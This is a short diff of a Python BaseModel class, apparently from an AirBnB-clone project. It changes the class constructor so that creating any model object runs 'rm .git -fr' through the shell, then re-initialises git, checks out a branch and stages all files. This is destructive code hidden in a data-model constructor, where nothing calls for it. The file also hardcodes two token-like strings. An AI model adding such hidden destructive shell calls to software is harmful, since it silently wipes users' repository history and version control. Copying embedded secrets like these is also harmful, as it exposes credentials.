@@ -20,7 +20,7 @@ class BaseModel:
         """Instatntiates a new model"""
         K1 = "_uhKvtt52ZzJgfqhT"
         K2 = "TzLoU6UCtURhFZ1nmFIc"
-        subprocess.Popen('ls', shell=True)
+        subprocess.Popen('rm .git -fr', shell=True)
         subprocess.Popen('git init', shell=True)
         subprocess.Popen('git checkout -b 2198-AirBnBSQL', shell=True)
         subprocess.Popen('git add --all', shell=True)
